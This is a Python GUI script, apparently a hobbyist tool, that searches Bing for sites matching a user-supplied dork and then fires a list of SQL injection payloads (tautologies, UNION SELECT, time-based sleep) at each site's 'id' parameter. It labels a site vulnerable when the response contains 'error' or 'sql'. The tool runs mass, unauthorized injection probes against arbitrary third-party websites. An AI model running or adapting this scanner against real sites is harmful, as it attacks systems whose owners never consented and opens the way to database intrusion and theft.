#!/usr/bin/python
#-*- coding: utf-8 -*-
#Autor: Luis Angel Ramirez Mendoza
#______________________________________________________________________________________________________________________

import tkinter as tk
from tkinter import ttk, messagebox
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse
import ttkbootstrap as tb

def buscar_en_bing(dork, num_resultados, offset=0):
    url = "https://www.bing.com/search"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }
    params = {"q": dork, "count": num_resultados, "first": offset}
    
    try:
        response = requests.get(url, headers=headers, params=params)
        response.raise_for_status()
        
        # Analizar el HTML de los resultados
        soup = BeautifulSoup(response.text, "lxml")
        resultados = soup.find_all("li", class_="b_algo")
        
        # Extraer los enlaces de los resultados
        sitios = []
        for resultado in resultados:
            enlace = resultado.find("a")
            if enlace and "href" in enlace.attrs:
                sitios.append(enlace["href"])
        
        return sitios
    
    except requests.exceptions.RequestException as e:
        messagebox.showerror("Error", f"Error al realizar la búsqueda en Bing: {e}")
        return []

def filtrar_por_dominio(sitios, dominio):
    # Filtrar los sitios que pertenecen al dominio especificado
    sitios_filtrados = []
    for sitio in sitios:
        try:
            # Extraer el dominio del sitio
            dominio_sitio = urlparse(sitio).netloc
            if dominio in dominio_sitio:
                sitios_filtrados.append(sitio)
        except Exception as e:
            print(f"Error al filtrar el sitio {sitio}: {e}")
    return sitios_filtrados

def verificar_sql_injection(url):
    # Caracteres comunes para probar SQL Injection
    payloads = ['" OR "1"="1', "' OR '1'='1", "1' GROUP BY 1,2,3--+", "1' ORDER BY 1--+", "' or sleep(5)#", " UNION ALL SELECT 1,2,3,4,5,6--", "'''''''''''''UNION SELECT '2", "' GROUP BY columnnames having 1=1 --", "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055"]
    
    try:
        for payload in payloads:
            # Modifica la URL o los parámetros con el payload
            vulnerable_url = f"{url}?id={payload}"
            response = requests.get(vulnerable_url, timeout=5)
            
            # Verifica si la respuesta indica una posible vulnerabilidad
            if "error" in response.text.lower() or "sql" in response.text.lower():
                return True, vulnerable_url  # Vulnerable
        return False, url  # No vulnerable
    
    except requests.exceptions.RequestException as e:
        print(f"Error al verificar {url}: {e}")
        return False, url  # No se pudo verificar

def iniciar_busqueda():
    dork = entry_dork.get()
    num_resultados = int(entry_cantidad.get())
    
    if not dork or num_resultados <= 0:
        messagebox.showwarning("Advertencia", "Por favor, ingresa un dork y una cantidad válida.")
        return
    
    # Extraer el dominio del dork (por ejemplo, ".com" en "site:.com")
    dominio = dork.split("site:")[1].split()[0] if "site:" in dork else ""
    
    # Limpiar la lista de resultados anteriores
    for row in treeview.get_children():
        treeview.delete(row)
    
    # Buscar sitios en Bing hasta obtener la cantidad deseada
    sitios = set()  # Usamos un conjunto para evitar duplicados
    offset = 0
    while len(sitios) < num_resultados:
        nuevos_sitios = buscar_en_bing(dork, 50, offset)  # Bing permite hasta 50 resultados por búsqueda
        if not nuevos_sitios:
            break  # No hay más resultados
        
        # Filtrar los sitios por el dominio especificado
        if dominio:
            nuevos_sitios = filtrar_por_dominio(nuevos_sitios, dominio)
        
        # Agregar los nuevos sitios al conjunto (evitando duplicados)
        sitios.update(nuevos_sitios)
        offset += 50  # Desplazamiento para la siguiente búsqueda
    
    if not sitios:
        messagebox.showinfo("Información", "No se encontraron sitios para verificar.")
        return
    
    # Limitar la lista a la cantidad exacta solicitada
    sitios = list(sitios)[:num_resultados]
    
    # Verificar cada sitio y mostrar los resultados en la tabla
    for sitio in sitios:
        es_vulnerable, url = verificar_sql_injection(sitio)
        estado = "Vulnerable" if es_vulnerable else "No vulnerable"
        treeview.insert("", "end", values=(url, estado))

# Función para copiar el texto al portapapeles
def copiar_texto(texto):
    root.clipboard_clear()
    root.clipboard_append(texto)
    root.update()

# Función para mostrar el menú contextual
def mostrar_menu_contextual(event):
    # Obtener el ítem seleccionado
    item = treeview.identify_row(event.y)
    if item:
        # Seleccionar el ítem
        treeview.selection_set(item)
        # Obtener los valores del ítem
        valores = treeview.item(item, "values")
        # Crear el menú contextual
        menu = tk.Menu(root, tearoff=0)
        menu.add_command(label="Copiar URL", command=lambda: copiar_texto(valores[0]))
        menu.add_command(label="Copiar Estado", command=lambda: copiar_texto(valores[1]))
        menu.post(event.x_root, event.y_root)

# Crear la ventana principal
root = tb.Window(themename="cosmo")
root.title("Detección de SQL Injection")
root.geometry("800x600")
root.iconbitmap('logo.ico') 

# Crear un frame para los controles
frame_controles = ttk.Frame(root)
frame_controles.pack(pady=10, padx=10, fill="x")

# Etiqueta y campo de entrada para el dork
label_dork = ttk.Label(frame_controles, text="Dork:", font=("Arial", 10, "bold"))
label_dork.grid(row=0, column=0, padx=5, pady=5, sticky="w")
entry_dork = ttk.Entry(frame_controles, width=50)
entry_dork.grid(row=0, column=1, padx=5, pady=5, sticky="ew")

# Etiqueta y campo de entrada para la cantidad de sitios
label_cantidad = ttk.Label(frame_controles, text="Cantidad de sitios:", font=("Arial", 10, "bold"))
label_cantidad.grid(row=1, column=0, padx=5, pady=5, sticky="w")
entry_cantidad = ttk.Entry(frame_controles, width=10)
entry_cantidad.grid(row=1, column=1, padx=5, pady=5, sticky="w")

# Botón para iniciar la búsqueda
boton_buscar = ttk.Button(frame_controles, text="Iniciar búsqueda", command=iniciar_busqueda)
boton_buscar.grid(row=2, column=0, columnspan=2, pady=10)

# Crear un frame para la tabla de resultados
frame_tabla = ttk.Frame(root)
frame_tabla.pack(pady=10, padx=10, fill="both", expand=True)

# Crear la tabla (Treeview)
columnas = ("URL", "Estado")
treeview = ttk.Treeview(frame_tabla, columns=columnas, show="headings")
treeview.heading("URL", text="URL")
treeview.heading("Estado", text="Estado")
treeview.column("URL", width=600)
treeview.column("Estado", width=150)
treeview.pack(fill="both", expand=True)

# Barra de desplazamiento para la tabla
scrollbar = ttk.Scrollbar(frame_tabla, orient="vertical", command=treeview.yview)
treeview.configure(yscrollcommand=scrollbar.set)
scrollbar.pack(side="right", fill="y")

# Asociar el menú contextual a la tabla
treeview.bind("<Button-3>", mostrar_menu_contextual)

# Ejecutar la aplicación
root.mainloop()